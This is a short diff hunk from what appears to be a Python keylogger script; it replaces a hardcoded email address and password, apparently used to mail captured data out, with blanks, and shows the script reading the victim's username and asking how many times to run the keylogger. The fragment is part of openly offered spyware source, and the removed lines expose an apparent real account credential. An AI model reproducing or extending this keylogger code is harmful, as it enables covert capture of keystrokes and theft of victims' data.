@@ -48,8 +48,8 @@ time_iteration = a
 n = int(input("How many time you want to run Keylogger:\n"))
 number_of_iterations_end = n
 
-email_address = "advakeylogger@gmail.com" # Enter disposable email here
-password = "advakeylogger12345" # Enter email password here
+email_address = " " # Enter disposable email here
+password = " " # Enter email password here
 
 username = getpass.getuser()
 
